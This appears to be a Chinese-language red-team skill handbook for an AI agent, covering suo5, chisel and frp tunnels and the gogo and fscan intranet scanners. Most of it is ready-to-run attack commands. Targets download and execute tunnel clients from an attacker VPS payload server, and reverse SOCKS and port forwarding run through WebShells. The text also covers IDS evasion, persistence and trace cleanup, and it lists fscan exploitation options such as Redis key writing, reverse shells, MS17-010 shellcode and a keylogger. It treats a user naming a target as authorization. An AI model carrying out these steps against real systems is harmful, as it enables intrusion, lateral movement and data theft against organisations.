> **环境约定（本文所有命令按此解析，不适用于上游 DSH 宿主）**
>
> | 变量 | 含义 | 本机取值 |
> |---|---|---|
> | `$RT_HOME` | 红队根目录 | 自定，如 `~/rt` |
> | `$RT_TOOLKIT` | 外部二进制目录 | 默认 `~/.local/bin` |
> | `$RT_SETUP` | 环境与配置目录 | 自定 |
> | `$RT_RUNS` | 证据根 | 默认 `./runs`（当前工作目录下，先 `mkdir -p runs`） |
> | `$RT_VPS` | VPS 地址 | 需自备 |
> | `$RT_IP` | 本机公网 IP | 需自备 |
> | `$RT_PUBKEY` | SSH 公钥路径 | 需自备 |
> | `$OAST_DOMAIN` | 外带/DNSLog 域名 | 需自备 |
>
> 本文中所有 `runs/` 均指 `$RT_RUNS`；所有 `redteam_*` 均为**记账接口，当前环境不存在**，
> 等价做法（写 `runs/*.jsonl`）与字段签名见 `50-tool-contract.md`。正文未改写的调用按伪代码读。
>
> 命令内的 `$TARGET` `$IP` `$PORT` `$USER` `$PASS` `$DOMAIN` `$DC_IP` `$HASH` `$NTHASH` `$DB` `$KEY` `$ID` `$TEMPLATE` 按本次目标填写；
> **不要写成 `<target>` 形式**——bash 会把尖括号当重定向符，随即报语法错误。

---

## suo5-tunnel

> 用 suo5 通过 WebShell/HTTP 建立 SOCKS5 隧道，把内网流量代理出来（内网突破核心工具）


# suo5 内网隧道

> **打进内网的标准通道只有这一条**：拿到 WebShell/RCE 后**必须**先用 suo5 建 socks5 隧道，
> 把隧道登记进库（`redteam_tunnel_add` kind=suo5）并用 `redteam_session_check` 验证真的通，
> 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。
> 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。

二进制：`$RT_TOOLKIT/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）

## 建立隧道
```bash
SUO5=$RT_TOOLKIT/suo5/suo5-linux-amd64

# 1) 用 WebShell 作为隧道端点（HTTP 型）
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) 需要认证时
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) 只走 HTTP 代理（部分工具只支持 http proxy）
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
参数速查：`-t` 目标 shell URL、`-l` 本地监听、`-m socks5|http`、`--auth user:pass`、`-r` 重连间隔、`--debug` 看流量。

## 通过隧道做内网操作
```bash
# curl 走 socks5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap 必须用 -sT（全连接）+ proxychains，或直接 --proxies（新版）
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# 数据库 / 中间件
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# 浏览器/接口测试走隧道
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## 内网扫描节奏（避免告警）
- 先 `/24` 存活探测（`nmap -sn` 经隧道或 ICMP），再对存活主机做常见端口。
- 速率降到 `-T2 --max-rate 50`，避免 IDS 触发。
- 新发现的资产全部 `redteam_asset_add`（会自动按 /24 建 C 段），并标 `provenance="active"`、`tool="suo5+nmap"`。

## 落库
- **建好立刻登记（强制）**：`redteam_tunnel_add`（`kind=suo5`、`listen=127.0.0.1:1080`、`entry=<WebShell URL>`、`reach=可达网段`、`command=完整启动命令`），`webshell_id` 指向对应的 WebShell 记录；随后 `redteam_session_check` 实测连通性，确认 status=active 再往下走。
- 隧道本身写 `redteam_chain_add`（stage=pivot，detail 写隧道端点与本地端口）。
- 每个内网资产、每次成功登录、每条凭据分别落库（asset/access/credential）。
- 隧道掉了用 `redteam_tunnel_update` 标 down；不要留一个"看起来在跑其实不通"的隧道给后续角色踩空。

## 注意事项
- 隧道端点文件用完后按需清理，恢复目标原状。
- 免费公网代理不适合承载隧道；suo5 走的是目标自身的 WebShell，不需要额外代理。
- 只在授权范围内使用。

---

## chisel-tunnel

> chisel 隧道：HTTP/WebSocket 封装的多路复用隧道，最易穿透出网限制与反向代理


# chisel（HTTP 隧道 / 端口转发）

> **先加载 VPS 配置**：本技能里所有 `$RT_VPS` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $RT_SETUP.sh` 写入 `$RT_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$RT_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$RT_VPS"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

`chisel` 把 TCP 流量封进 **HTTP/WebSocket**，因此**最容易穿过只放行 80/443 的出网策略与反向代理**。
它和 suo5 的分工：

| | suo5 | chisel |
| --- | --- | --- |
| 入口前提 | **必须有 WebShell**（HTTP 通道） | **只要有命令执行**（能跑二进制即可） |
| 传输 | HTTP 长连接（伪装成正常请求） | HTTP/WebSocket（upgrade） |
| 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |
| 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |

**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。

## 本机二进制

| 文件 | 路径 |
| --- | --- |
| chisel（Linux amd64，服务端与客户端同一个二进制） | `$RT_TOOLKIT/chisel/chisel`（v1.12.0） |

已同步到 VPS 载荷目录：`http://$RT_VPS:9100/`（目标可 `curl` 直接拉）。

## 一、反向 SOCKS（最常用：目标主动连我们）

```bash
# 1) 我方 VPS 起服务端（tmux 里跑，别让 SSH 断开杀掉）
tmux new -s chisel
$RT_TOOLKIT/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  允许客户端注册反向隧道
#    --socks5   开启内置 SOCKS5（客户端连上后该端口即可用）
#    可选加固：--auth user:pass   加认证，避免被扫到白用
#    可选伪装：--backend http://127.0.0.1:80  把 Web 流量转发到本地站点

# 2) 目标侧起客户端（通过已有的 RCE/命令执行点跑；先把二进制拉上去）
curl -s http://$RT_VPS:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $RT_VPS:9443 R:socks
#    R:socks = 反向 SOCKS；连上后 VPS 的 1080 端口即为内网 SOCKS5 入口

# 3) 本机通过 VPS 的 SOCKS 访问内网
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf 里写：socks5 $RT_VPS 1080
#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
```

## 二、反向端口转发（把内网某个端口映射出来）

```bash
# 目标侧：把内网 10.0.0.5:3389 映射到 VPS 的 13389
/tmp/c client $RT_VPS:9443 R:13389:10.0.0.5:3389
# 本机：直接连 VPS:13389 即为内网 3389
rdesktop $RT_VPS:13389
```

## 三、正向 SOCKS（目标能直连我们、但我们要主动连目标内网）

```bash
# 目标侧起服务端
/tmp/c server -p 9443 --socks5
# 我方起客户端做本地转发
chisel client $TARGET:9443 1080:socks
# 之后 proxychains 指向 127.0.0.1:1080
```

## 四、多级 / 联动

```bash
# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$RT_VPS:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $RT_VPS:9443 R:socks2 &"
# 逐层扩大可达范围，每层都要登记隧道与可达网段
```

## 五、纪律与自保

1. **必须跑在 tmux / nohup 里**：会话断开隧道就没了（`nohup ... &` 或 `tmux`）。
2. **服务端加认证**：公网 VPS 上的 chisel 服务端会被扫端口，加 `--auth user:pass`，用完 `pkill` 关掉。
3. **端口选择**：别用 80/443（可能被 VPS 上别的服务占用），用 9443/8443 等高位端口；
   **VPS 安全组要放行**。
4. **目标侧落地要清理痕迹与文件**：`/tmp/c` 用完可删；注意别把二进制放在有明显特征的路径。
5. **不要用自建 VPS 上的代理冒充"突破"**：隧道登记 `entry_kind` 必须说清目标侧那一端（见下）。

## 六、输出与落库（强制）

1. **隧道登记 `redteam_tunnel_add`**，字段必须写全：
   - `kind`：`chisel`；
   - `listen`：**用户实际能用的监听地址**（如 `$RT_VPS:1080` 或 `127.0.0.1:1080`）；
   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；
   - `reach`：**可达网段**（如 `10.0.0.0/24`，实测出来再填，别猜）；
   - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或
     `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；
     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
   - `command`：完整命令原文（服务端 + 客户端两段都要）。
2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，
   通了才算隧道成立；然后 `redteam_session_check` 回写状态。
3. **得分**：隧道可达内网 → `redteam_score_hit`（`boundary-logical`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
   通过它横向到其它主机 → `server-host`。
4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），
   写清监听地址与端口，并说明该隧道跨越了靶标边界。
5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。

---

## frp-tunnel

> frp 内网穿透：在自有 VPS 上跑 frps，在目标上跑 frpc，得到稳定 socks5 与端口映射


# frp（内网穿透，最稳的长期隧道）

> **先加载 VPS 配置**：本技能里所有 `$RT_VPS` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $RT_SETUP.sh` 写入 `$RT_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$RT_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$RT_VPS"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

`frp` 是**最稳定、最常用**的穿透方案：VPS 上跑 `frps`（服务端），目标上跑 `frpc`（客户端），
把内网的 socks5 或任意端口映射出来。相比 suo5/chisel，它**专为长期稳定运行设计**（自动重连、多路复用、TLS），
适合打进去之后**长期挂着**的内网通道。

**分工**：有 WebShell → `suo5-tunnel`；只有命令执行要快速进内网 → `chisel-tunnel`；
要**长期稳定 + 把端口给用户直接用** → 本技能。

## 本机二进制

| 文件 | 路径 | 用途 |
| --- | --- | --- |
| frps | `$RT_TOOLKIT/frp/frps` | VPS 上的服务端 |
| frpc | `$RT_TOOLKIT/frp/frpc` | 目标上的客户端 |

已同步到 VPS 载荷目录 `http://$RT_VPS:9100/`。VPS 上还有 `frps` 的配置样例。

## 一、VPS 侧：起 frps（先做）

```bash
# 1) 上传并准备（本机 → VPS）
scp -i $RT_TOOLKIT/vps/id_rsa \
    $RT_TOOLKIT/frp/frps $VPS_USER@$RT_VPS:/root/frps

# 2) 写配置（VPS 上）
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc 连接端口
auth.method = "token"
auth.token = "<随机强 token>"   # 必填：公网暴露必须加 token，否则被扫到白用

# 可选：vhostHTTPPort / vhostHTTPSPort 用于 HTTP 类型穿透
EOF

# 3) tmux 里跑（断开 SSH 也不能死）
tmux new -s frps
/root/frps -c /root/frps.toml
```

**VPS 安全组放行**：`7000`（frpc 连接口）+ 后续映射出来的端口（如 `1080`、`13389`）。

## 二、目标侧：跑 frpc

```bash
# 1) 拉取二进制（通过已有命令执行点）
curl -s http://$RT_VPS:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) 写配置
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$RT_VPS"
serverPort = 7000
auth.method = "token"
auth.token = "<与 frps 相同的 token>"

# ① 内网 SOCKS5（最有用：整个内网可达）
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# ② 指定端口映射（例：内网 RDP → VPS 13389）
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# ③ 可选：HTTP 类型（走 80/443 出网受限时配合 frps 的 vhostHTTPPort）
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) 后台常驻跑（nohup + 断线自动重连）
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows 目标：frpc.exe -c C:\Windows\Temp\frpc.toml（可用 sc create 注册服务持久化）
```

## 三、本机使用隧道

```bash
# SOCKS5 模式：VPS:1080 就是内网入口
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# 配置里写：socks5 $RT_VPS 1080
# ⛔ 不要改 /etc/proxychains4.conf，用 -f 指向 runs/ 下临时配置

# 端口映射模式：直连 VPS 端口
rdesktop $RT_VPS:13389
mysql -h $RT_VPS -P 13306 -u root -p
```

## 四、出网受限时的变体

| 限制 | 处理 |
| --- | --- |
| 只能出 80/443 | frps `bindPort = 443`（或先用 80 跑 HTTP 类型），frpc 对应改端口 |
| 有 TLS 中间盒拦截 | frp 自带 `transport.tls.enable = true`（默认开）；必要时用 `transport.protocol = "kcp"` 或 `websocket` |
| 目标不能出网 | frp 方案不可用 → 走 WebShell 侧隧道（`suo5-tunnel`） |
| 需要伪装成正常流量 | `transport.protocol = "websocket"` + `transport.tls.enable = true`（走 443 时像普通 WebSocket） |

## 五、持久化与纪律

1. **必须跑在 tmux（服务端）/ nohup（客户端）**，否则会话一断隧道即失。
2. **服务端必须加 `auth.token`**：公网 VPS 的 7000 端口会被全网扫，无 token 等于把内网送人。
3. **token 不要复用**：每次演练生成新的随机 token；用完 `pkill frps` / `pkill frpc` 及时关闭。
4. **目标侧注意落地痕迹**：二进制与配置放 `/tmp`，用完清理；Windows 用 `Temp` 目录。
5. **不要用它做非法用途**：本技能仅限授权演练（用户给出靶标即代表已授权）。

## 六、输出与落库（强制）

1. **隧道登记 `redteam_tunnel_add`**，字段写全：
   - `kind`：`frp`；
   - `listen`：用户实际使用的地址（如 `$RT_VPS:1080`）；
   - `entry`：目标侧入口（如 `10.0.0.6 上 /tmp/frpc → VPS:7000`）；
   - `reach`：**实测可达网段**；
   - `entry_kind`：**`target-outbound`**（目标出网连我们的 frps——这是 frp 的典型形态）；
     ⛔ 只在自己 VPS 上开代理填 `self-only` → 会被标"不算突破"；
   - `command`：frps 与 frpc 两段完整命令 + 配置要点（token 脱敏）。
2. **实测连通**：`curl --socks5-hostname $RT_VPS:1080 http://<内网目标>/`，通了才登记为 active；
   然后 `redteam_session_check` 复查。
3. **得分**：`boundary-logical`（隧道可达内网，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
   通过它横向 → `server-host`。
4. **交付给用户**：给出可直接粘贴的 `socks5://$RT_VPS:1080` 或映射端口，写清地址与端口。
5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要
   （如 `frpc 注册成功，proxy socks5 start success`）。

---

## gogo-intranet

> gogo v2.15.0 高性能内网扫描引擎：智能/超智能模式、主动+被动指纹、关键信息提取（title/cert/JWT/邮箱/身份证）、nuclei 模板 POC、发包可控低噪声


# gogo（内网测绘与指纹引擎）

`gogo` = **高并发、低噪声、高度可配置的测绘引擎**。链式反应出品，专为红队内网场景设计：
最小发包原则、主动+被动指纹、关键信息提取、内核级 POC 引擎（neutron，兼容 nuclei 模板）、
支持 DSL/workflow 自定义。**先 gogo 铺面，再 fscan 打点。**

## 与 fscan 的分工

| | gogo | fscan |
| --- | --- | --- |
| 强项 | 大网段测绘、指纹、信息提取、可控发包 | 弱口令爆破、未授权、高危漏洞、利用 |
| 默认噪声 | 低（`--opsec`、线程/超时可调） | 高（600 线程 + 爆破 + POC 全开） |
| 输出 | `.dat`（deflate JSON Lines）+ 格式化 | txt/json/csv |
| 典型用法 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## 二进制

```
本机 : $RT_TOOLKIT/gogo/gogo                （v2.15.0，4.3MB，自带 3138 条指纹）
       $RT_TOOLKIT/gogo/gogo_windows_amd64.exe
       $RT_TOOLKIT/gogo/gogo_linux_arm64
VPS  : http://$RT_VPS:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）
文档 : https://chainreactors.github.io/wiki/gogo/
模板 : https://github.com/chainreactors/templates

# 跳到跳板机/目标上执行
curl -o gogo http://$RT_VPS:9100/gogo && chmod +x gogo
```

**零依赖**：单个静态二进制，指纹与提取规则全部内置，Windows 2003 都能跑。**不需要**额外配置文件。

## 纪律

1. **范围**：`--exclude` / `--exclude-file` 排除授权范围外网段，别把办公网和云元数据段扫了。
2. **先探路再扫描**：`ip a; ip route; arp -a; cat /etc/hosts` —— 内网拓扑往往能省掉一半扫描。
3. **OPSEC**：敏感环境加 `--opsec`，线程压到 `-t 200~500`，超时 `-d 3`；大网段必须 `--ping` 先过滤。
4. **不要 `-p -`（全端口）扫大网段**，那是自杀式发包；先 `top2` 再对存活主机上全端口。

## 核心概念

### 端口预设（这工具的灵魂）

```bash
gogo -P port        # 列出全部预设 tag 与对应端口
```

常用 tag：`top1`(80,443,8080) · `top2`(数百个常见 Web/服务端口) · `top3` · `common`(内网常用) ·
`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(全集)

```bash
p 组合：-p top2,win,db          # 逗号任意组合
p 范围：-p 1-1000               # 区间
p 全部：-p -                    # 等于 1-65535（慎用）
p 单点：-p 6379,mysql,12345
```

### 三种扫描模式

| 模式 | 参数 | 适用 |
| --- | --- | --- |
| default | （默认） | 单 IP / 小网段（/24 以内） |
| smart | `-m s` | /24~/16，AB 段探测 + 启发式发散 |
| supersmart | `-m ss` | /16 以上大内网，先探点再筛选网段 |
| sc | `-m sc` | 已知目标段、要更细的端口覆盖 |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### workflow（把复杂命令存成预设）

```bash
gogo -P workflow     # 列出全部 workflow
gogo -w 10           # 等价于扫 10.0.0.0/8 的 supersmart 全流程（all 端口）
gogo -w 172          # 172.16.0.0/12
gogo -w 192          # 192.168.0.0/16
gogo -w interc       # 内网常见 C 段（10/172/192 三段）
gogo -w 10 -i 11.0.0.0/8 -p top2   # 命令行可覆盖 workflow 参数
```

## 参数速查（实测 v2.15.0 `-h`）

> **多字符长参数必须双横线**：`--ipp`、`--sp`、`--ef`、`--af`。单横线只给 `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j` 这类单字符。

**输入**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   目标，逗号分隔多个
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> 目标列表文件        -L  从 stdin 读目标
-j <file> 复用上次结果(.dat)或 ip:port 列表，继续深挖     -J  从 stdin 读
```

**输出**
```
-f <file>        输出文件名         --path  输出目录
-o <fmt>         命令行输出格式     -O <fmt>  文件输出格式（默认 jsonlines）
--af             自动命名输出文件（.dat，deflate JSON Lines）
--hf             自动命名隐藏文件   -C  关闭压缩      --tee  同时保留控制台输出
-q/--quiet       关日志只留结果（联动其他工具必加）
-F <file>        格式化已有 .dat 结果
--filter / --output-filter / --scan-filter   历史过滤 / 实时过滤 / 提前停止
```

**智能扫描**
```
-m/--mod  default|s|ss|sc    扫描模式
--ping                       先 ICMP 过滤（大网段必须）
-n/--no                      只做智能扫描，不进入默认扫描
--sp   smart 端口探针（默认 80，ss 模式默认 icmp）
--ipp  AB 段 IP 探针（默认 1,254）
```

**性能与隐蔽**
```
-t/--thread <n>     并发（linux 默认 4000，内网建议 200~1000）
-d/--timeout <秒>   超时（默认 2）
-D/--ssl-timeout     SSL 超时
--opsec             低噪声模式（敏感环境开）
-s/--spray          端口优先喷洒（端口数 >500 自动启用）
--no-spray          强制关闭喷洒
```

**指纹与提取**
```
-v/--verbose         主动指纹识别（不发这个只有被动指纹，信息少但安静）
--ff <file>          自定义指纹库
--extract "<regex>"  自定义提取正则
gogo -P extract      查看内置提取规则（jwt / mail / idcard / phone / ip 等）
```

**漏洞（neutron 内核）**
```
-e/--exploit         开启 POC 扫描（与 -v 合用写作 -ev）
-E <name>            指定模板名        --ef <file>  指定模板文件
--payload <s>        指定 payload      --attack-type sniper|clusterbomb|pitchfork
```

**代理**
```
--proxy socks5://127.0.0.1:11111      # 实测可用，走 suo5 / ssh -D 隧道
```

## 标准作业流程（SOP）

```bash
# 0) 探路
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) 大网段测绘（安静、先探活、结果落文件）
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) 看结果（human-like）
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) 对存活主机上全端口 + 主动指纹
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) 定向打 POC（只对确认有指纹的目标）
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E $TEMPLATE

# 5) 复用上一步结果继续深挖（不用重扫）
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### 走隧道测绘（内网渗透主路径）

```bash
# 前提：技能 suo5-tunnel 建好 socks5，或 vps-reverse-shell 里 ssh -D
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q

# 实测：gogo --proxy socks5:// 会把流量真正送进隧道（经 VPS 扫到的是 VPS 的 SSH 指纹）
```

隧道场景把 `-t` 降到 300 以内、`-d` 提到 5，否则隧道会丢包误判。

## 结果落库（必须做）

gogo 的 `.dat` 是压缩 JSON Lines，先格式化再解析入库：

```bash
./gogo -F ./result.dat -o json -f result.json      # 转成 JSON（实测产物结构见下）
python3 tools/parse.py result.json
# 解析要点：顶层是 {config, ip, data:[...]}，每条含 ip/port/protocol/status/frameworks/title/timing
```
```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
# 实测单条：{"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
#             "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
#             "title":"SSH-2.0-OpenS","timing":26}
```

```bash
# 入库纪律（与 fscan 相同）
redteam_asset_add      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
redteam_web_list       # 之后由 web 指纹技能补充 URL/标题
redteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # 必须配证据
```

**注意**：gogo 的框架/指纹结果写进 `asset` 的 `fingerprint` 字段，不要只留在终端里。
扫到的敏感信息提取结果（邮箱/身份证/JWT）属于「大量敏感信息」得分点，用 `redteam_vuln_add` +
`redteam_score_hit` 记录，证据落 `runs/`。

## 排障

| 现象 | 处理 |
| --- | --- |
| 参数报错 | 长参数用双横线（`--af` 不是 `-af`），`-P` 只接受 `port/workflow/neutron/extract` |
| 结果文件找不到 | `--af` 写在**二进制同目录**，加 `--path` 指定目录 |
| 大网段几乎没结果 | `--ping` 会漏掉禁 ping 主机；去掉 `--ping` 或改 `--ipp` 调整探针 |
| 扫描太慢 | 提高 `-t`、降低 `-d`；`-p` 换成 `top1`/`top2`；大网段用 `-m ss` |
| 被 IDS 发现 | `--opsec` + `-t 200` + `-d 3`；不要开 `-e`；不要 `-p -` |
| 隧道里大量超时 | 降 `-t`、升 `-d`，隧道带宽是瓶颈 |
| 想只看结果不看日志 | `-q`（联动其他工具必加） |

## 相关技能

- `fscan-intranet`：铺面之后的爆破与利用
- `suo5-tunnel`：WebShell → SOCKS5，给 gogo 提供 `--proxy` 入口
- `vps-reverse-shell`：隧道与载荷投递
- `web-fingerprint` / `asset-correlation`：把 gogo 的结果进一步关联成资产图谱

---

## fscan-intranet

> fscan v2.2.1 内网综合扫描：存活探测、端口/服务识别、28 类弱口令爆破、未授权访问与高危漏洞（MS17-010/SMBGhost）、Redis 利用与 SOCKS5 隧道


# fscan（内网综合扫描与弱口令/漏洞）

`fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、
弱口令、未授权访问、高危漏洞。**噪声大**，只适合内网（对互联网目标用外部扫描技能）。

## 与 gogo 的分工

| | fscan | gogo |
| --- | --- | --- |
| 定位 | 综合普查 + 爆破 + 利用 | 高性能测绘 + 指纹 + 信息提取 |
| 噪声 | 大（默认 600 线程 + 爆破 + POC） | 可控（`--opsec`、线程/超时自调） |
| 先用哪个 | 目标明确、要快速找弱口令与洞 | 大网段先铺面、要指纹和 title |

**推荐顺序**：先 `gogo` 铺面拿资产清单 → 再 `fscan` 对确认存活的目标做定向爆破与漏洞。

## 二进制

```
本机 : $RT_TOOLKIT/fscan/fscan          （v2.2.1，含本地插件）
       $RT_TOOLKIT/fscan/fscan_windows_x64.exe
       $RT_TOOLKIT/fscan/fscan_linux_arm64
VPS  : http://$RT_VPS:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）
```

**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：

```bash
# 跳板机上直接下载（VPS 起载荷服务：$RT_TOOLKIT/vps/vps.sh serve 9100）
curl -o fscan http://$RT_VPS:9100/fscan && chmod +x fscan
# 或从本机经 shells 上传
```

## 纪律（先看这条）

1. **范围**：只用授权清单内的网段；用 `-eh/-ehf` 显式排除办公网、打印机、工控、云元数据（169.254.169.254）。
2. **别打崩设备**：默认 `-t 600` 对老设备/工控很危险。内网先用 `-t 100 -time 3`，确认设备扛得住再加。
3. **先无爆破再爆破**：第一轮 `-nobr -nopoc` 只做资产面；确认目标重要性和授权后，第二轮再放开。
4. **避开蜜罐/IDS**：`-rate` 限速、`-maxpkts` 限量；管理员可能在看着。
5. **DNSLog 外带**：`-dns -domain $OAST_DOMAIN`，别用公共 DNSLog 传敏感数据。

## 标准作业流程（SOP）

```bash
# 0) 确认自己在哪、能到哪
ip a; ip route

# 1) 存活普查（最快，先圈定活人）
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) 资产面（不爆破、不打 POC，最安静）
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web 优先：把 assets.txt 里的 web 端口交给截图/指纹环节
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) 定向爆破（授权确认后）
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) 高危漏洞与未授权
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## 参数速查（实测 v2.2.1 `-help`）

**目标**
```
-h  <IP|CIDR|文件|域名>   目标（IP 段文件也吃）
-hf <file>                主机文件        -eh/-ehf  排除主机/排除文件
-u  <URL>  -uf <file>     单 URL / URL 文件     -domain <域名>
```

**端口与存活**
```
-p  21,22,80,443,3306,6379,10000-10100    端口（默认内置约 150 个常用端口）
-pf <file>  端口文件        -ep 排除端口
-np         禁用 ping 探测（只扫端口，快）      -ao  仅存活探测
-nsp        禁用网段预筛（大网段提速）          -ntp 禁用 TCP 补充探测
```

**模式**
```
-m all        默认全流程（含爆破+POC）
-m icmp       仅存活
-m <插件>     只跑指定服务插件，例如 -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         禁爆破   -nopoc 禁 POC   -noredis 禁 Redis 利用
```

**并发与节流**（OPSEC 关键）
```
-t 600       端口扫描线程        -time 3   端口超时(秒)
-mt 20       模块线程            -wt 5     Web 超时
-gt 0        全局超时(秒)        -retry 3  重试次数
-rate 0      每分钟最大发包数(0=不限)   -maxpkts 0  总发包上限
-num 20      POC 并发            -icmp-rate 0.1  ICMP 速率
```

**凭据（爆破）**
```
-user/-pwd      单组账号密码          -userf/-pwdf  字典文件
-upf            用户名:密码 对文件     -usera/-pwda  追加多个（逗号/空格分隔）
-hash/-hashf    NTLM Hash 碰撞        -sshkey       私钥登录
```

**利用（拿到就用，注意授权边界）**
```
-rf <pubkey>        Redis 写公钥（写 authorized_keys 拿 SSH）
-rs                Redis Shell        -rwc/-rwf/-rwp  Redis 写入内容/文件/路径
-rsh <ip:port>     反弹 Shell 到指定地址（配合技能 vps-reverse-shell）
-sc <shellcode>    MS17-010 ShellCode
-local <plugin>    本机插件：systeminfo / keylogger / cleaner 等（在跳板机上跑）
-start-socks5 1080 在跳板机上开 SOCKS5 服务，把内网暴露给本机
-fsh-port 4444     正向 Shell 服务端口
```

**代理（打隧道后的核心用法）**
```
-socks5 127.0.0.1:1080                 走 SOCKS5（suo5 / ssh -D / frp 都行）
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           走 HTTP 代理
```

**输出**
```
-o result.txt    输出文件        -f txt|json|csv   格式
-no              不保存结果      -silent  静默     -nocolor/-nopg  关颜色/进度条
-lang zh|en      语言            -log "base,info,success"   日志级别
-dns             记录 DNS 日志（配合 -domain 做外带检测）
